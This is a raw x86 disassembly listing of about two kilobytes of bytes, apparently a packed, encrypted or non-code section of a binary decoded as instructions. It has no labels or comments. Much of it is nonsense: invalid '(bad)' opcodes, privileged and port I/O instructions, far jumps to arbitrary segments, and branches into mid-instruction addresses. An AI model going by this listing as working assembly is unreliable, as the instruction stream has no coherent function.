  4162da:	add    DWORD PTR [ebx],0xffffffa4
  4162dd:	pop    es
  4162de:	dec    edi
  4162df:	scas   eax,DWORD PTR es:[edi]
  4162e0:	fsub   DWORD PTR [ecx-0x10]
  4162e3:	or     edi,DWORD PTR [ecx-0x770e011b]
  4162e9:	ss lahf 
  4162eb:	xchg   ecx,eax
  4162ec:	fs mov esp,0x8c602514
  4162f2:	addr16 addr16 pop edi
  4162f5:	adc    eax,0x7b7ecf55
  4162fa:	arpl   sp,bx
  4162fc:	sbb    al,0x5
  4162fe:	int    0x40
  416300:	cmp    al,0x23
  416302:	sbb    edx,DWORD PTR [esi+0x2e294f9]
  416308:	mov    ecx,0x34223ce6
  41630d:	mov    eax,ds:0x75bacc74
  416312:	fidivr WORD PTR [ebx-0x4b18ad2f]
  416318:	les    ebx,FWORD PTR [eax-0x42]
  41631b:	pop    ebp
  41631c:	mov    dh,0x36
  41631e:	pusha  
  41631f:	(bad)  
  416320:	mov    edi,0x66abf1b8
  416325:	call   0x74792e89
  41632a:	out    dx,al
  41632b:	dec    edx
  41632c:	aaa    
  41632d:	loopne 0x416328
  41632f:	pop    DWORD PTR ds:0x5bd5c0c5
  416335:	rcr    ah,cl
  416337:	imul   edi,DWORD PTR [esi],0xffffffba
  41633a:	cmp    al,0xd2
  41633c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41633d:	mul    DWORD PTR [esi+esi*8-0x7a51410c]
  416344:	dec    ebx
  416345:	jne    0x41632f
  416347:	add    ah,al
  416349:	add    bh,ch
  41634b:	pop    ecx
  41634c:	mov    dl,0x54
  41634e:	sub    DWORD PTR [ebx+ebx*8-0x24403567],esi
  416355:	mov    bl,dh
  416357:	jecxz  0x416378
  416359:	adc    eax,DWORD PTR [eax-0x53]
  41635c:	mov    edi,0x37da796d
  416361:	je     0x4162f6
  416363:	inc    ebp
  416364:	sbb    dl,BYTE PTR [eax+edi*1]
  416367:	add    DWORD PTR [esi+0xf99d9c3],eax
  41636d:	adc    eax,0x82bfe9e8
  416372:	mov    dl,0xcb
  416374:	je     0x416352
  416376:	sbb    al,0xd7
  416378:	fsub   QWORD PTR [edi-0x7e7200c4]
  41637e:	dec    ebp
  41637f:	inc    ecx
  416380:	mov    ebp,0xe3dbb3e9
  416385:	xchg   DWORD PTR [eax+0x37],edx
  416388:	ins    DWORD PTR es:[edi],dx
  416389:	(bad)  
  41638b:	retf   0x13a
  41638e:	pop    ecx
  41638f:	inc    ecx
  416390:	and    al,0x51
  416392:	and    al,bl
  416394:	and    bl,ch
  416396:	xchg   dh,bh
  416398:	inc    ebx
  416399:	enter  0x4801,0x24
  41639d:	std    
  41639e:	cli    
  41639f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163a0:	(bad)  
  4163a1:	iret   
  4163a2:	adc    BYTE PTR [ebp-0x267cf813],cl
  4163a8:	sbb    edx,DWORD PTR [ebx]
  4163aa:	cmp    BYTE PTR [ecx+0x12be4c64],ah
  4163b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163b1:	and    DWORD PTR [ecx],esi
  4163b3:	mov    edi,0x6dc394d1
  4163b8:	cmp    ecx,ebx
  4163ba:	cs addr16 int3 
  4163bd:	inc    ebx
  4163be:	sbb    eax,0x784cbd30
  4163c3:	daa    
  4163c4:	outs   dx,BYTE PTR ds:[esi]
  4163c5:	sbb    al,0xc1
  4163c7:	sub    eax,0x5ab8e4ca
  4163cc:	mov    ds:0x6a1c6c06,al
  4163d1:	ja     0x41643d
  4163d3:	sub    ecx,ebx
  4163d5:	or     al,0xd0
  4163d7:	mov    cl,0x41
  4163d9:	sbb    eax,0xb3f1586b
  4163de:	or     ah,0xf1
  4163e1:	clc    
  4163e2:	call   0xe52a9caa
  4163e7:	mov    ?,WORD PTR [eax]
  4163e9:	sub    al,0x41
  4163eb:	ret    0x411b
  4163ee:	sbb    edi,DWORD PTR [ecx-0x2713d012]
  4163f4:	rcl    DWORD PTR [ecx-0x3ae3c6c8],cl
  4163fa:	loope  0x4163a7
  4163fc:	scas   eax,DWORD PTR es:[edi]
  4163fd:	mov    cl,0xa5
  4163ff:	jbe    0x41645b
  416401:	pop    esp
  416402:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416403:	mov    dl,0xec
  416405:	icebp  
  416406:	inc    ebp
  416407:	fistp  DWORD PTR [eax-0xa]
  41640a:	data16 icebp 
  41640c:	shl    DWORD PTR [esi-0x75],0xb7
  416410:	adc    eax,0xdff9909a
  416415:	test   DWORD PTR [ebp+eiz*4+0x53a6cff0],ebx
  41641c:	dec    ebp
  41641d:	inc    ebp
  41641e:	dec    ebx
  41641f:	sub    ah,BYTE PTR [edx]
  416421:	fldenv [edx]
  416423:	adc    BYTE PTR [ebp+esi*1+0x2dd95c20],dl
  41642a:	adc    eax,0xc974e1ff
  41642f:	es mov ebx,0x87bd09c7
  416435:	hlt    
  416436:	sbb    DWORD PTR [eax+0x798f1278],ecx
  41643c:	mov    dl,0x12
  41643e:	fidiv  DWORD PTR [edx]
  416440:	lea    eax,[ecx-0x13]
  416443:	jmp    0x9644:0x200905c2
  41644a:	cmp    ecx,edx
  41644c:	cmp    DWORD PTR [esi+eax*1],edi
  41644f:	(bad)  
  416450:	adc    ebp,DWORD PTR [edx]
  416452:	ret    
  416453:	je     0x416449
  416455:	jbe    0x416435
  416457:	leave  
  416458:	xor    BYTE PTR [esi+0x66],al
  41645b:	je     0x4164ba
  41645d:	sub    BYTE PTR [eax-0x5ba90abb],ah
  416463:	retf   0x30af
  416466:	sbb    BYTE PTR [eax+0x1c6793f0],ah
  41646c:	popf   
  41646d:	xchg   ebp,eax
  41646e:	push   0xffffffa4
  416470:	retf   
  416471:	pop    ds
  416472:	jnp    0x416426
  416474:	ins    DWORD PTR es:[edi],dx
  416475:	mov    DWORD PTR [edx-0x1fe9eb27],esi
  41647b:	push   ecx
  41647c:	cmp    ebx,DWORD PTR [edi-0x15]
  41647f:	mov    edx,0x4b9e8cbb
  416484:	sbb    ecx,DWORD PTR [bp+di]
  416487:	sub    eax,0x8aeb22b0
  41648c:	add    eax,0x5f65396e
  416491:	add    bl,BYTE PTR [edi+eiz*4]
  416494:	inc    edx
  416495:	(bad)  
  416496:	(bad)  
  416497:	push   esp
  416498:	sti    
  416499:	and    al,0x63
  41649b:	leave  
  41649c:	and    BYTE PTR [edx+0x23],ch
  41649f:	mov    edi,0x7d186e71
  4164a4:	popf   
  4164a5:	rol    BYTE PTR [eax-0xaa3d891],0x16
  4164ac:	sbb    BYTE PTR [edx-0x3d],0x1f
  4164b0:	push   edi
  4164b1:	add    ebx,esi
  4164b3:	jo     0x416464
  4164b5:	test   eax,0xe863e216
  4164ba:	jb     0x4164ed
  4164bc:	mov    ah,0x7e
  4164be:	sub    BYTE PTR [edi],dh
  4164c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164c1:	imul   BYTE PTR [ebx+0xb14e406]
  4164c7:	int    0xa0
  4164c9:	mov    ah,BYTE PTR [edi]
  4164cb:	ins    BYTE PTR es:[edi],dx
  4164cc:	ins    BYTE PTR es:[edi],dx
  4164cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164ce:	(bad)  
  4164cf:	dec    esp
  4164d0:	ret    0x1c46
  4164d3:	loop   0x4164ee
  4164d5:	jmp    0x4c4e:0xbcb89e0d
  4164dc:	push   ss
  4164dd:	rcr    BYTE PTR [edi],0xd7
  4164e0:	test   eax,0x6926032f
  4164e5:	pop    eax
  4164e6:	jb     0x416520
  4164e8:	clc    
  4164e9:	dec    edx
  4164ea:	mov    eax,0x187c3890
  4164ef:	mov    bl,0x1e
  4164f1:	(bad)  
  4164f2:	push   esi
  4164f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164f4:	ror    BYTE PTR [esi+0x2b],1
  4164f7:	pop    es
  4164f8:	push   ebp
  4164f9:	jp     0x416519
  4164fb:	and    ch,BYTE PTR ds:0x7858e56d
  416501:	mov    edx,0xcf6b79f0
  416506:	xlat   BYTE PTR ds:[ebx]
  416507:	rcl    ebp,1
  416509:	pop    esp
  41650a:	or     BYTE PTR [edx],0x5f
  41650d:	loop   0x4164b1
  41650f:	inc    ebp
  416510:	shr    al,cl
  416512:	and    al,0xf
  416514:	jge    0x4164d2
  416516:	ret    
  416517:	cmp    eax,0x2a2c555d
  41651c:	test   DWORD PTR [ecx-0x7a],ecx
  41651f:	xchg   esi,eax
  416520:	jnp    0x4164a8
  416522:	jns    0x416504
  416524:	pop    DWORD PTR [ebp+eiz*1-0x1a3f17bb]
  41652b:	retf   
  41652c:	push   0x73
  41652e:	les    esi,FWORD PTR cs:[ecx-0xc54170b]
  416535:	add    DWORD PTR [esi],edx
  416537:	mov    DWORD PTR [ecx],edx
  416539:	cmp    dl,al
  41653b:	std    
  41653c:	dec    ebp
  41653d:	fs adc eax,0xce407a8
  416543:	pop    ss
  416544:	ins    DWORD PTR es:[edi],dx
  416545:	sbb    eax,0xe9ee54ae
  41654a:	(bad)  
  41654b:	fdiv   DWORD PTR [esi+0x12ac4106]
  416551:	test   eax,0xc4f27802
  416556:	push   esp
  416557:	pushf  
  416558:	out    dx,eax
  416559:	push   0xffffffeb
  41655b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41655c:	mov    DWORD PTR [ebx+eax*2-0x12],esp
  416560:	pop    ebp
  416561:	dec    esp
  416562:	jp     0x41650e
  416564:	sub    ch,BYTE PTR [esi-0x7389b0cf]
  41656a:	rcl    DWORD PTR [ebp-0xa],1
  41656d:	inc    edi
  41656e:	jnp    0x416573
  416570:	out    0xff,eax
  416572:	rol    DWORD PTR [esi],0x80
  416575:	or     edx,esp
  416577:	std    
  416578:	mov    ebx,DWORD PTR ds:[edi+0x42667258]
  41657f:	adc    BYTE PTR [ebp+0x2e],bl
  416582:	push   cs
  416583:	xchg   ecx,eax
  416584:	pop    es
  416585:	in     ax,dx
  416587:	pushf  
  416588:	icebp  
  416589:	or     cl,BYTE PTR [ebx+0x60229ea5]
  41658f:	push   esp
  416590:	ins    BYTE PTR es:[edi],dx
  416591:	push   esp
  416592:	xchg   ebp,eax
  416593:	call   0x6df9:0xc0d52364
  41659a:	sti    
  41659b:	jmp    0x41661a
  41659d:	mov    ecx,0x322688dd
  4165a2:	or     al,0x44
  4165a4:	sbb    BYTE PTR [edx-0x54],dh
  4165a7:	je     0x4165c7
  4165a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165aa:	pop    ecx
  4165ab:	or     esi,DWORD PTR [edi]
  4165ad:	add    edx,ebp
  4165af:	mov    ah,0x9a
  4165b1:	(bad)  
  4165b2:	lds    esp,FWORD PTR [edx+0x50ee2413]
  4165b8:	cmp    DWORD PTR [edx],edi
  4165ba:	ja     0x4165c9
  4165bc:	inc    esi
  4165bd:	and    BYTE PTR [ebp-0x1d],ch
  4165c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165c1:	xlat   BYTE PTR ds:[ebx]
  4165c2:	inc    edi
  4165c3:	inc    BYTE PTR [esi-0x2e0e0756]
  4165c9:	je     0x41656e
  4165cb:	(bad)  
  4165cc:	dec    ebp
  4165cd:	mov    edi,0xc3b2c54
  4165d2:	push   eax
  4165d3:	cmc    
  4165d4:	sub    BYTE PTR [ebp+0x53],dl
  4165d7:	push   edx
  4165d8:	mov    bh,0x12
  4165da:	cdq    
  4165db:	ja     0x416609
  4165dd:	pop    ss
  4165de:	dec    esi
  4165df:	dec    ebx
  4165e0:	fsubr  st(2),st
  4165e2:	out    0xb9,al
  4165e4:	fcmovnb st,st(6)
  4165e6:	sub    ecx,DWORD PTR [esi+0x4f0dfaa9]
  4165ec:	test   dl,al
  4165ee:	mov    ebp,0xb719e8b8
  4165f3:	sub    DWORD PTR [eax],ebx
  4165f5:	imul   eax,DWORD PTR [edx+0x6275fbb8],0xffffffa0
  4165fc:	sub    edi,DWORD PTR [eax+0x3048aa83]
  416602:	iret   
  416603:	aam    0x2f
  416605:	sbb    edx,ebp
  416607:	and    al,0x2f
  416609:	adc    al,0xd0
  41660b:	push   edx
  41660c:	push   eax
  41660d:	cmp    DWORD PTR [edi],0x1f
  416610:	cmc    
  416611:	and    bh,BYTE PTR [edx+esi*4-0x64]
  416615:	(bad)  
  416616:	pop    esp
  416617:	mov    BYTE PTR ds:0xb1e9e8f7,ch
  41661d:	jns    0x4165c6
  41661f:	pop    ss
  416620:	or     al,0xa1
  416622:	push   ss
  416623:	xor    BYTE PTR [edx],cl
  416625:	fisttp QWORD PTR [ecx+0x34]
  416628:	in     al,0xc8
  41662a:	dec    ebx
  41662b:	rcl    DWORD PTR [ebx-0x6240841d],0x7d
  416632:	das    
  416633:	dec    edx
  416634:	not    ah
  416636:	dec    esp
  416637:	sub    bl,BYTE PTR [esi-0x3c]
  41663a:	add    esp,DWORD PTR [ebx]
  41663c:	inc    ebx
  41663d:	add    edx,edi
  41663f:	push   ebp
  416640:	arpl   WORD PTR [edi+0x2f],bp
  416643:	mov    ds:0x8b6a5ce3,al
  416648:	jmp    0x8041:0xbed77aa3
  41664f:	cmc    
  416650:	ins    BYTE PTR es:[edi],dx
  416651:	pop    es
  416652:	mov    dl,0x90
  416654:	in     al,dx
  416655:	jnp    0x4165fe
  416657:	cdq    
  416658:	call   0xdc4a7b31
  41665d:	call   0x1554:0xd42a840d
  416664:	jo     0x416661
  416666:	dec    esp
  416667:	add    ebp,DWORD PTR [ebp+0x19466e68]
  41666d:	outs   dx,DWORD PTR ds:[esi]
  41666e:	cmp    DWORD PTR [eax-0x7338a9f9],ebp
  416674:	lods   eax,DWORD PTR ds:[esi]
  416675:	jp     0x416683
  416677:	lahf   
  416678:	jmp    0x6cee2282
  41667d:	addr16 loopne 0x4166e2
  416680:	hlt    
  416681:	mov    ds:0x96a99a9,al
  416686:	adc    BYTE PTR [edx+0x2a3b8a4b],0x6b
  41668d:	or     esi,DWORD PTR [edx]
  41668f:	xchg   esi,eax
  416690:	(bad)  
  416691:	sti    
  416692:	inc    eax
  416693:	cwde   
  416694:	shl    ah,1
  416696:	scas   al,BYTE PTR es:[edi]
  416697:	jl     0x4166d9
  416699:	test   eax,0xe0bc97b0
  41669e:	mov    esi,0x8641fbbe
  4166a3:	jb     0x41670a
  4166a5:	xchg   edx,eax
  4166a6:	pop    edx
  4166a7:	icebp  
  4166a8:	sahf   
  4166a9:	sub    al,0x67
  4166ab:	jns    0x416644
  4166ad:	dec    eax
  4166ae:	push   DWORD PTR [ecx-0x71601ae9]
  4166b4:	push   0x2cc97fac
  4166b9:	sbb    dl,BYTE PTR [ebx-0x68b1feaf]
  4166bf:	mov    al,0xeb
  4166c1:	call   0x4c1185a4
  4166c6:	xchg   edx,eax
  4166c7:	sub    al,0xdf
  4166c9:	ret    0xf2af
  4166cc:	ficomp DWORD PTR [ecx+0x3ef8b1fc]
  4166d2:	jns    0x416665
  4166d4:	or     BYTE PTR [edx],ch
  4166d6:	pop    edx
  4166d7:	add    al,bh
  4166d9:	mov    ecx,0x7b59034c
  4166de:	push   ebp
  4166df:	push   es
  4166e0:	mov    al,0xbd
  4166e2:	mov    bl,0x28
  4166e4:	adc    bh,bl
  4166e6:	add    bh,BYTE PTR [bx+0x1e2a]
  4166eb:	adc    DWORD PTR [ebp+0x4802ad5f],edi
  4166f1:	jp     0x416748
  4166f3:	xor    BYTE PTR [edi-0x3f43024d],ch
  4166f9:	dec    ebx
  4166fa:	push   edi
  4166fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166fc:	inc    ebp
  4166fd:	mov    edx,0x90c89ea5
  416702:	aas    
  416703:	int    0x9
  416705:	and    edx,eax
  416707:	sahf   
  416708:	sbb    al,0x6a
  41670a:	ret    0xd198
  41670d:	outs   dx,DWORD PTR ds:[esi]
  41670e:	clc    
  41670f:	inc    edi
  416710:	pushf  
  416711:	jmp    0x4166b4
  416713:	jmp    0x4166ba
  416715:	dec    esp
  416716:	fild   QWORD PTR [edi+0x27]
  416719:	(bad)  
  41671a:	and    DWORD PTR [edx],ebx
  41671c:	and    bh,BYTE PTR [ecx-0x3907e7ef]
  416722:	dec    eax
  416723:	les    ebx,FWORD PTR [ebx-0x11b4056e]
  416729:	int3   
  41672a:	loopne 0x41671c
  41672c:	mov    cs,edx
  41672e:	icebp  
  41672f:	adc    BYTE PTR [edi],0x71
  416732:	ds pop ds
  416734:	xor    al,ch
  416736:	mov    ebx,0x2f72d819
  41673b:	dec    esp
  41673c:	jl     0x41678f
  41673e:	mov    ds:0xd2a74d77,eax
  416743:	inc    ebp
  416744:	int    0x2c
  416746:	add    al,0xae
  416748:	clc    
  416749:	(bad)  
  41674a:	loope  0x4166e1
  41674c:	aad    0xea
  41674e:	iret   
  41674f:	int    0x89
  416751:	popf   
  416752:	sbb    al,0xfc
  416754:	or     BYTE PTR ds:0x66a742cb,ah
  41675a:	mov    ch,BYTE PTR ds:0xc6a2c43c
  416760:	lahf   
  416761:	sbb    eax,0x2335bff4
  416766:	in     al,0x8
  416768:	repnz mov bl,0x49
  41676b:	shl    DWORD PTR [esi+eiz*1-0x4746a210],cl
  416772:	jmp    0xea9a:0x1a02985f
  416779:	pop    eax
  41677a:	aas    
  41677b:	test   DWORD PTR [esp+esi*2],0x74da1dc2
  416782:	jne    0x41679b
  416784:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416785:	les    edi,FWORD PTR [ecx-0x234b08ee]
  41678b:	xor    eax,0xd0d49932
  416790:	retf   
  416791:	out    dx,eax
  416792:	popa   
  416793:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416794:	out    dx,eax
  416795:	fwait
  416796:	cmp    eax,0x8ed7a575
  41679b:	ret    0xee8c
  41679e:	mov    dh,0xa3
  4167a0:	push   ss
  4167a1:	fdiv   QWORD PTR [ebx]
  4167a3:	lods   al,BYTE PTR es:[esi]
  4167a5:	imul   esp,DWORD PTR [edx],0x3c
  4167a8:	xchg   BYTE PTR [edi-0x1b],bh
  4167ab:	fild   WORD PTR [ebx]
  4167ad:	sbb    BYTE PTR [edx+edx*1-0x5674af4f],bh
  4167b4:	and    DWORD PTR [ecx+0x4d],ecx
  4167b7:	test   bx,cx
  4167ba:	in     al,0xde
  4167bc:	xchg   ebp,eax
  4167bd:	pop    ds
  4167be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167bf:	mov    cl,0xfa
  4167c1:	lods   al,BYTE PTR ds:[esi]
  4167c2:	retf   0xa3f8
  4167c5:	xor    al,0x3e
  4167c7:	fldcw  WORD PTR [edx]
  4167c9:	js     0x4167a3
  4167cb:	in     al,dx
  4167cc:	dec    eax
  4167cd:	add    bl,BYTE PTR [esi]
  4167cf:	std    
  4167d0:	and    DWORD PTR [ebx],ebx
  4167d2:	fistp  QWORD PTR [esi+0x5a]
  4167d5:	scas   al,BYTE PTR es:[edi]
  4167d6:	xor    eax,0x8ec278a6
  4167db:	loope  0x416858
  4167dd:	sbb    BYTE PTR [ecx-0x1b],0x82
  4167e1:	dec    esi
  4167e2:	pop    ebx
  4167e3:	pop    esp
  4167e4:	cmp    DWORD PTR [eax-0x5a],edi
  4167e7:	rcr    BYTE PTR [ebx+ecx*4+0x8456f1d],0xcb
  4167ef:	push   ds
  4167f0:	sahf   
  4167f1:	sbb    DWORD PTR [ecx+0x47],esi
  4167f4:	je     0x4167b9
  4167f6:	jae    0x4167ad
  4167f8:	shr    DWORD PTR [edi+0x3c351ffa],0xd7
  4167ff:	push   eax
  416800:	fdivr  DWORD PTR [ebx-0x46b1e91f]
  416806:	jmp    0xe995fc67
  41680b:	or     BYTE PTR [ecx-0xd],al
  41680e:	push   es
  41680f:	mov    cl,0xdd
  416811:	inc    esi
  416812:	push   ebx
  416813:	mov    edi,0xe42069a9
  416818:	cwde   
  416819:	fsincos 
  41681b:	xchg   edx,eax
  41681c:	sub    edi,DWORD PTR [edx+eax*2+0x58aae5a2]
  416823:	lahf   
  416824:	mov    cs,WORD PTR [edx]
  416826:	jle    0x41688b
  416828:	jmp    0x81e9ac5a
  41682d:	xchg   ebp,eax
  41682e:	dec    ecx
  41682f:	xchg   BYTE PTR [eax-0x5ed5bd1f],dh
  416835:	adc    bl,BYTE PTR [edx]
  416837:	shr    DWORD PTR [esi],0x8b
  41683a:	loopne 0x416893
  41683c:	or     ah,bh
  41683e:	xchg   edx,eax
  41683f:	and    BYTE PTR [esi],ch
  416841:	repnz lods al,BYTE PTR ds:[esi]
  416843:	les    ecx,FWORD PTR [edx+0x76]
  416846:	mov    ebp,0x94b75125
  41684b:	lea    esp,[ebp-0x79b1e205]
  416851:	shl    BYTE PTR [edx],1
  416853:	xchg   ebp,eax
  416854:	arpl   bp,cx
  416856:	dec    eax
  416857:	mov    dl,0xdb
  416859:	inc    ecx
  41685a:	add    BYTE PTR [ebx],ah
  41685c:	and    bl,BYTE PTR [edi-0x505b31e]
  416862:	imul   esp,eax,0x28
  416865:	sub    BYTE PTR [edx-0x9d3b889],al
  41686b:	xor    ecx,DWORD PTR [edi+0x3f]
  41686e:	adc    al,0x6f
  416870:	xchg   BYTE PTR [eax-0x764dc8ee],bl
  416876:	out    0x40,eax
  416878:	lods   al,BYTE PTR ds:[esi]
  416879:	adc    DWORD PTR ds:0xb9043c84,edx
  41687f:	sub    DWORD PTR [esi-0x6da85296],edi
  416885:	jl     0x41680d
  416887:	das    
  416888:	test   al,0xed
  41688a:	leave  
  41688b:	sub    esp,DWORD PTR [edi-0x4e36319e]
  416891:	nop
  416892:	mov    bl,BYTE PTR [esi-0x7b01a301]
  416898:	mov    ecx,0x125ae9f1
  41689d:	cmp    DWORD PTR [edx-0x70],ebp
  4168a0:	sbb    al,BYTE PTR [ebx-0x44e972bd]
  4168a6:	rcl    esp,cl
  4168a8:	cmp    ebp,DWORD PTR [ecx-0x50]
  4168ab:	lock cli 
  4168ad:	fld    DWORD PTR [ebp+0x59]
  4168b0:	mov    DWORD PTR [ecx+esi*2+0x4a],eax
  4168b4:	mov    ds:0x610598ad,al
  4168b9:	sub    BYTE PTR [eax-0x6ebc541f],bl
  4168bf:	pusha  
  4168c0:	outs   dx,BYTE PTR ds:[esi]
  4168c1:	repz or BYTE PTR [eax+0x6a4263dd],bh
  4168c8:	or     al,0xa8
  4168ca:	mov    dl,0x28
  4168cc:	mov    ah,0xd3
  4168ce:	fisubr WORD PTR [ebx-0x14]
  4168d1:	aad    0xb
  4168d3:	fistp  QWORD PTR [edi+ebp*8-0x16]
  4168d7:	sar    BYTE PTR [eax-0x7a],1
  4168da:	outs   dx,DWORD PTR ds:[esi]
  4168db:	pusha  
  4168dc:	mov    ds:0xb90bdcb3,al
  4168e1:	and    esi,DWORD PTR [ebx]
  4168e3:	inc    ebp
  4168e4:	mov    bh,0xf3
  4168e6:	mov    cl,0x6f
  4168e8:	dec    esi
  4168e9:	je     0x4168ae
  4168eb:	xor    eax,0x901f6634
  4168f0:	xchg   ebp,eax
  4168f1:	(bad)  
  4168f2:	ins    DWORD PTR es:[edi],dx
  4168f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168f5:	xchg   esi,eax
  4168f6:	or     esp,esp
  4168f8:	and    cl,BYTE PTR [eax]
  4168fa:	or     eax,0xbbfc6f99
  4168ff:	inc    eax
  416900:	pop    eax
  416901:	push   ds
  416902:	push   edi
  416903:	xor    bl,BYTE PTR [ecx]
  416905:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416906:	loopne 0x416899
  416908:	mov    bl,0x18
  41690a:	inc    ebx
  41690b:	cmc    
  41690c:	xor    BYTE PTR [ebp-0x5f],bh
  41690f:	cmc    
  416910:	or     dl,BYTE PTR [ebp+0x18c35a3a]
  416916:	xor    eax,0x79f21f0b
  41691b:	push   es
  41691c:	outs   dx,DWORD PTR ds:[esi]
  41691d:	or     DWORD PTR [edx-0x22],esi
  416920:	sub    ebp,DWORD PTR [ebp+0x33]
  416923:	ja     0x416917
  416925:	pop    edx
  416926:	dec    esp
  416927:	or     DWORD PTR [esi+0x21],esp
  41692a:	rol    DWORD PTR [ecx+0x4b],cl
  41692d:	lock popf 
  41692f:	mov    dl,0xd
  416931:	cdq    
  416932:	add    DWORD PTR [ebp+0x6f],ecx
  416935:	fidiv  WORD PTR [eax-0x53]
  416938:	sahf   
  416939:	repz mov eax,ds:0x9513fac2
  41693f:	outs   dx,DWORD PTR ds:[esi]
  416940:	mov    DWORD PTR [edx+ecx*2],edi
  416943:	imul   ebp
  416945:	mov    eax,0x453dd2ca
  41694a:	xchg   edi,eax
  41694b:	out    0x2b,eax
  41694d:	inc    edx
  41694e:	and    DWORD PTR [eax],0x14
  416951:	xchg   DWORD PTR [ebp+0x30],ebp
  416954:	add    ebx,DWORD PTR [edi]
  416956:	dec    esi
  416957:	mov    ds:0x7b0338c2,al
  41695c:	cmp    BYTE PTR [ebx+0xe57afa3],cl
  416962:	repz fist WORD PTR [eax+0x46709b63]
  416969:	sti    
  41696a:	cmp    BYTE PTR [ebp-0x70c68ff6],ah
  416970:	cmp    DWORD PTR [edi+edx*1+0x376f2e17],ebp
  416977:	or     eax,0xe3fdddaf
  41697c:	call   0x3e92:0x7b546f26
  416983:	fldcw  WORD PTR [esi-0x3fd29ab9]
  416989:	or     BYTE PTR [eax+edi*1+0x4ac57035],ch
  416990:	jnp    0x416915
  416992:	adc    DWORD PTR [esi+eax*8-0x65],edi
  416996:	dec    ebx
  416997:	aas    
  416998:	add    al,0x7b
  41699b:	push   edi
  41699c:	ret    
  41699d:	pop    ecx
  41699e:	in     eax,0xd5
  4169a0:	outs   dx,DWORD PTR ds:[esi]
  4169a1:	mov    edi,0xf75b922f
  4169a6:	xlat   BYTE PTR ds:[ebx]
  4169a7:	cmp    BYTE PTR [esi],0x64
  4169aa:	jns    0x416a0e
  4169ac:	jne    0x416958
  4169ae:	loop   0x41698c
  4169b0:	loop   0x416932
  4169b2:	jb     0x416981
  4169b4:	xor    DWORD PTR [edx-0x68],esp
  4169b7:	xchg   esp,eax
  4169b8:	cwde   
  4169b9:	dec    edx
  4169ba:	pop    eax
  4169bb:	cld    
  4169bc:	das    
  4169bd:	test   DWORD PTR [esi+0x649a2501],ebx
  4169c3:	mov    eax,0x971c2627
  4169c8:	loop   0x4169c0
  4169ca:	fnstsw WORD PTR [ecx+0x7c0e9b81]
  4169d0:	loop   0x4169d7
  4169d2:	push   bx
  4169d4:	repnz int 0x9a
  4169d7:	mov    al,ds:0xc9858999
  4169dc:	cmp    eax,eax
  4169de:	lock xor ebp,ebx
  4169e1:	sti    
  4169e2:	cld    
  4169e3:	jmp    0xf27:0xe6c0b0f8
  4169ea:	push   ebp
  4169eb:	ds push esi
  4169ed:	loopne 0x416a06
  4169ef:	jo     0x416a09
  4169f1:	add    dl,BYTE PTR [ebp+0x5c]
  4169f4:	int3   
  4169f5:	jb     0x416a26
  4169f7:	cmp    DWORD PTR [eax],ebp
  4169f9:	js     0x4169d1
  4169fb:	outs   dx,DWORD PTR ds:[esi]
  4169fc:	or     DWORD PTR [edi+0x66],ebx
  4169ff:	out    dx,eax
  416a00:	mov    edx,0x4d5daa3f
  416a05:	test   DWORD PTR [si+0x38],esi
  416a09:	cld    
  416a0a:	xchg   ebp,eax
  416a0b:	mov    bl,0x18
  416a0d:	pop    ds
  416a0e:	mov    ecx,0x12d8d1fa
  416a13:	mov    ch,BYTE PTR [esi+0x8]
  416a16:	push   ecx
  416a17:	xor    DWORD PTR [eax-0x4862254e],edi
  416a1d:	js     0x416a53
  416a1f:	or     ebp,esi
  416a21:	ja     0x4169ec
  416a23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a24:	cmp    ebx,DWORD PTR [ebx]
  416a26:	ret    0x4911
  416a29:	mov    eax,ds:0x3f3937c6
  416a2e:	inc    ebx
  416a2f:	jmp    0xea502c77
  416a34:	mov    cl,0x93
  416a36:	das    
  416a37:	mov    dh,0x73
  416a39:	in     eax,dx
  416a3a:	rcl    ebp,1
  416a3c:	mov    bh,BYTE PTR [edi+0x14da45e5]
  416a42:	jmp    0xb2587014
  416a47:	cli    
  416a48:	jmp    0xb7ab6b7e
  416a4d:	add    DWORD PTR [edx],eax
  416a4f:	test   eax,0x3770e2d9
  416a54:	dec    esi
  416a55:	jne    0x4169eb
  416a57:	sub    dl,BYTE PTR [edx-0x3f]
  416a5a:	xchg   esp,eax
  416a5b:	mov    esp,0x3ca9d82f
  416a60:	jmp    0x416ab4
  416a62:	push   esi
  416a63:	and    BYTE PTR [eax],ch
  416a65:	retf   
  416a66:	dec    esi
  416a67:	outs   dx,DWORD PTR ds:[esi]
  416a68:	mov    ebp,0xc01f16a9
  416a6d:	mov    bh,0xd0
  416a6f:	jnp    0x416a34
  416a71:	add    dh,bh
  416a73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a74:	idiv   DWORD PTR [ebx-0x353317b3]
  416a7a:	dec    esp
  416a7b:	mov    bl,0xe1
  416a7d:	pop    ebx
  416a7e:	mov    al,0xb6
  416a80:	ins    DWORD PTR es:[edi],dx
  416a81:	lahf   
  416a82:	call   0x36c:0xd329e4e0
  416a89:	xor    cl,0x1f
  416a8c:	dec    ebx
  416a8d:	dec    edx
  416a8e:	pop    ebx
  416a8f:	daa    
  416a90:	push   ebx
  416a91:	xchg   edx,eax
  416a92:	call   0xfdb5c7d3
  416a97:	js     0x416acd
  416a99:	xor    bl,BYTE PTR [di]
  416a9c:	in     eax,dx
  416a9d:	imul   ebx,edx,0xffffffab
  416aa0:	outs   dx,DWORD PTR ds:[esi]
  416aa1:	cmp    al,0xd9
  416aa3:	(bad)  
